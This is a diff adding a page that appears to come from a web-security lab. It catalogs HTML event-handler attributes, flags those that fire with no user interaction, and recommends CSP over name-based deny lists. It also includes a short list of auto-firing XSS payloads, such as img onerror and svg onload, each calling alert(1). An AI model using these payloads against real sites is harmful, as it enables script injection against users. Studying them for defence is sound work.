@@ -1,0 +1,233 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Module 05 — The Event Handler Catalog (150+)</title>
+<link rel="stylesheet" href="../assets/lab.css">
+<link rel="stylesheet" href="../module_05_event_handlers/module.css">
+<style>
+  .flt { padding:8px 10px; border:1px solid var(--border); border-radius:6px;
+         font:inherit; width:100%; margin:8px 0 4px; }
+  .auto { color: var(--danger); font-weight:700; }
+  .count { color: var(--muted); }
+  td.ev code { background:#eef0f3; }
+</style>
+</head>
+<body>
+<nav class="nav">
+  <a href="/">◂ Lab home</a>
+  <a href="../module_05_event_handlers/attack_02_events.html">◂ Module 05</a>
+  <a href="../module_06_uri_schemes/">Module 06 ▸</a>
+</nav>
+
+<p class="kicker">Module 05 · Companion reference</p>
+<h1>The Event-Handler Catalog</h1>
+<p class="lead">Every <code>on*</code> attribute is a JavaScript execution sink.
+This is why an allow/deny list of handler names is a losing game — the surface is
+huge and grows with every spec. Rows marked <span class="auto">AUTO</span> can
+fire with <em>no</em> user interaction, given the right element/attribute combo.</p>
+
+<div class="card">
+<strong>Defensive reading.</strong> Do not try to memorize these. Absorb the
+<em>shape</em> of the problem: the set is large, versioned, and partly
+auto-firing. A correct defense refuses <em>all</em> inline handlers by capability
+(CSP <code>script-src</code> without <code>'unsafe-inline'</code>, or attribute
+encoding that prevents any <code>on*</code> from forming) rather than enumerating
+names.
+</div>
+
+<input id="flt" class="flt" placeholder="filter (e.g. 'auto', 'mouse', 'error', 'svg')">
+<p class="count" id="count"></p>
+<table>
+<thead><tr><th>Event attribute</th><th>Fires when</th><th>Auto?</th><th>Typical carrier element</th></tr></thead>
+<tbody id="tb"></tbody>
+</table>
+
+<h2>The auto-firing short list (memorize these)</h2>
+<p>You rarely need 150. These reliably fire with zero interaction and cover
+almost every real injection:</p>
+<pre><code>&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;body onpageshow=alert(1)&gt;
+&lt;input autofocus onfocus=alert(1)&gt;
+&lt;select autofocus onfocus=alert(1)&gt;
+&lt;textarea autofocus onfocus=alert(1)&gt;
+&lt;video&gt;&lt;source onerror=alert(1)&gt;
+&lt;audio src=x onerror=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;style onload=alert(1)&gt;&lt;/style&gt;
+&lt;object data=x onerror=alert(1)&gt;
+&lt;iframe onload=alert(1)&gt;</code></pre>
+
+<footer>
+Module 05 of 19 · Back to <a href="../module_05_event_handlers/attack_02_events.html">the attack tutorial</a>.
+The full list is illustrative, not exhaustive — new handlers arrive with new specs.
+</footer>
+
+<script>
+// A representative catalog. Grouped by family. `auto:true` means it can fire
+// without user interaction given the right element/attribute pairing.
+const EVENTS = [
+  // --- Resource / loading (the auto-firing gold) ---
+  ["onerror","a resource (img/script/audio/video/object) fails to load",true,"img, audio, video>source, object, script"],
+  ["onload","an element or resource finishes loading",true,"body, svg, iframe, img, script, style, link, object"],
+  ["onloadstart","media begins loading",true,"audio, video"],
+  ["onloadeddata","media's first frame is available",true,"audio, video"],
+  ["onloadedmetadata","media metadata loaded",true,"audio, video"],
+  ["onpageshow","page is shown (incl. from bfcache)",true,"body"],
+  ["onpagehide","page is being hidden",false,"body"],
+  ["onbeforeunload","the window is unloading",false,"body"],
+  ["onhashchange","the URL fragment changes",false,"body"],
+  ["onpopstate","history entry changes",false,"body"],
+  ["onafterprint","print dialog closed",false,"body"],
+  ["onbeforeprint","before printing",false,"body"],
+  // --- Focus family (auto with autofocus) ---
+  ["onfocus","element gains focus (auto via autofocus)",true,"input, select, textarea, a, button, [tabindex]"],
+  ["onfocusin","focus enters (bubbling)",true,"most elements"],
+  ["onblur","element loses focus",false,"form controls"],
+  ["onfocusout","focus leaves (bubbling)",false,"most elements"],
+  // --- Toggle / details / dialog ---
+  ["ontoggle","a <details> opens/closes (auto with open)",true,"details"],
+  ["onbeforetoggle","before a popover/details toggles",true,"[popover], details"],
+  ["oncancel","a <dialog> is dismissed",false,"dialog"],
+  ["onclose","a <dialog> closes",false,"dialog"],
+  // --- Legacy auto-firers ---
+  ["onstart","a <marquee> starts scrolling",true,"marquee"],
+  ["onbounce","a <marquee> bounces",true,"marquee"],
+  ["onfinish","a <marquee> finishes",true,"marquee"],
+  // --- Mouse ---
+  ["onclick","primary button clicked",false,"any"],
+  ["ondblclick","double click",false,"any"],
+  ["onmousedown","button pressed",false,"any"],
+  ["onmouseup","button released",false,"any"],
+  ["onmouseover","pointer enters",false,"any"],
+  ["onmouseout","pointer leaves",false,"any"],
+  ["onmousemove","pointer moves over element",false,"any"],
+  ["onmouseenter","pointer enters (no bubble)",false,"any"],
+  ["onmouseleave","pointer leaves (no bubble)",false,"any"],
+  ["oncontextmenu","right-click / context menu",false,"any"],
+  ["onwheel","mouse wheel over element",false,"any"],
+  ["onauxclick","non-primary button click",false,"any"],
+  // --- Pointer / touch ---
+  ["onpointerdown","pointer contact begins",false,"any"],
+  ["onpointerup","pointer contact ends",false,"any"],
+  ["onpointermove","pointer moves",false,"any"],
+  ["onpointerover","pointer enters",false,"any"],
+  ["onpointerenter","pointer enters (no bubble)",false,"any"],
+  ["onpointerleave","pointer leaves",false,"any"],
+  ["onpointercancel","pointer cancelled",false,"any"],
+  ["onpointerrawupdate","raw pointer update",false,"any"],
+  ["ongotpointercapture","element captures pointer",false,"any"],
+  ["onlostpointercapture","element loses pointer capture",false,"any"],
+  ["ontouchstart","touch begins",false,"any (touch)"],
+  ["ontouchend","touch ends",false,"any (touch)"],
+  ["ontouchmove","touch moves",false,"any (touch)"],
+  ["ontouchcancel","touch cancelled",false,"any (touch)"],
+  // --- Keyboard ---
+  ["onkeydown","key pressed",false,"focusable"],
+  ["onkeyup","key released",false,"focusable"],
+  ["onkeypress","key producing a char (legacy)",false,"focusable"],
+  // --- Form ---
+  ["onsubmit","form submitted",false,"form"],
+  ["onreset","form reset",false,"form"],
+  ["onchange","control value committed",false,"input, select, textarea"],
+  ["oninput","control value changes",false,"input, textarea, [contenteditable]"],
+  ["onbeforeinput","before input is applied",false,"editable"],
+  ["oninvalid","constraint validation fails",false,"form controls"],
+  ["onselect","text selected in a field",false,"input, textarea"],
+  ["onsearch","search input cleared/submitted",false,"input[type=search]"],
+  ["onformdata","form data is being constructed",false,"form"],
+  // --- Clipboard / drag ---
+  ["oncopy","content copied",false,"any"],
+  ["oncut","content cut",false,"any"],
+  ["onpaste","content pasted",false,"any"],
+  ["ondrag","element is dragged",false,"[draggable]"],
+  ["ondragstart","drag begins",false,"[draggable]"],
+  ["ondragend","drag ends",false,"[draggable]"],
+  ["ondragenter","dragged into a target",false,"any"],
+  ["ondragleave","dragged out of a target",false,"any"],
+  ["ondragover","dragged over a target",false,"any"],
+  ["ondrop","dropped onto a target",false,"any"],
+  // --- Media playback ---
+  ["onplay","playback begins",true,"audio, video (autoplay)"],
+  ["onplaying","playback actually playing",true,"audio, video (autoplay)"],
+  ["onpause","playback paused",false,"audio, video"],
+  ["onended","playback finished",false,"audio, video"],
+  ["onvolumechange","volume changes",false,"audio, video"],
+  ["onseeked","seek completes",false,"audio, video"],
+  ["onseeking","seeking",false,"audio, video"],
+  ["ontimeupdate","playback position changes",true,"audio, video (autoplay)"],
+  ["ondurationchange","duration changes",true,"audio, video"],
+  ["onratechange","playback rate changes",false,"audio, video"],
+  ["oncanplay","enough data to play",true,"audio, video"],
+  ["oncanplaythrough","can play to end",true,"audio, video"],
+  ["onstalled","fetch stalled",true,"audio, video"],
+  ["onsuspend","media loading suspended",true,"audio, video"],
+  ["onwaiting","waiting for data",true,"audio, video"],
+  ["onemptied","media emptied",true,"audio, video"],
+  ["onprogress","download progress",true,"audio, video, img"],
+  ["onabort","loading aborted",true,"audio, video, img"],
+  // --- Scroll / view / animation ---
+  ["onscroll","element scrolls",false,"scrollable"],
+  ["onscrollend","scrolling ends",false,"scrollable"],
+  ["onresize","element/window resized",true,"body, [resize]"],
+  ["onanimationstart","CSS animation starts",true,"any (with animation)"],
+  ["onanimationend","CSS animation ends",true,"any"],
+  ["onanimationiteration","CSS animation repeats",true,"any"],
+  ["ontransitionstart","CSS transition starts",true,"any"],
+  ["ontransitionend","CSS transition ends",true,"any"],
+  ["ontransitionrun","transition is queued",true,"any"],
+  ["ontransitioncancel","transition cancelled",false,"any"],
+  // --- Misc / device / network ---
+  ["onwebkitanimationend","legacy webkit animation end",true,"any"],
+  ["onwebkitanimationstart","legacy webkit animation start",true,"any"],
+  ["onwebkittransitionend","legacy webkit transition end",true,"any"],
+  ["ononline","browser goes online",false,"body"],
+  ["onoffline","browser goes offline",false,"body"],
+  ["onmessage","postMessage received",true,"body/window"],
+  ["onmessageerror","malformed message received",false,"body/window"],
+  ["onstorage","web storage changed",false,"body"],
+  ["ondevicemotion","device motion",false,"body"],
+  ["ondeviceorientation","device orientation",false,"body"],
+  ["onselectionchange","document selection changes",false,"document"],
+  ["onselectstart","selection begins",false,"any"],
+  ["oncuechange","a text track cue changes",true,"track"],
+  ["onslotchange","slotted nodes change",true,"slot"],
+  ["oncontextlost","canvas context lost",false,"canvas"],
+  ["oncontextrestored","canvas context restored",false,"canvas"],
+  ["onsecuritypolicyviolation","CSP violation fires",false,"any"],
+  ["ratechange","(alias) playback rate change",false,"media"],
+];
+
+const tb = document.getElementById("tb");
+const flt = document.getElementById("flt");
+const count = document.getElementById("count");
+
+function render(filter) {
+  const f = (filter || "").toLowerCase();
+  tb.innerHTML = "";
+  let shown = 0;
+  for (const [name, when, auto, el] of EVENTS) {
+    const hay = (name + " " + when + " " + el + (auto ? " auto" : "")).toLowerCase();
+    if (f && !hay.includes(f)) continue;
+    shown++;
+    const tr = document.createElement("tr");
+    tr.innerHTML =
+      `<td class="ev"><code>${name}</code></td>` +
+      `<td>${when}</td>` +
+      `<td>${auto ? '<span class="auto">AUTO</span>' : '—'}</td>` +
+      `<td>${el}</td>`;
+    tb.appendChild(tr);
+  }
+  const autos = EVENTS.filter(e => e[2]).length;
+  count.textContent = `${shown} shown of ${EVENTS.length} catalogued (${autos} can auto-fire). ` +
+    `The real platform total exceeds 150 across all specs.`;
+}
+flt.addEventListener("input", () => render(flt.value));
+render("");
+</script>
+</body>
+</html>
